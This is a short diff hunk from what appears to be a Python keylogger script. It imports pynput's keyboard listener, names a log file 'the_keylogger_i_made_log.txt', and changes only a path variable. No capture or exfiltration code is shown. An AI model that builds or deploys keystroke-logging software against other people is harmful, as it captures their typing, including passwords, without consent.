@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 from re import sub
 
 filename = "the_keylogger_i_made_log.txt"
-path = ".\\"
+path = ""
 extension = "\\"
 
 count = 0
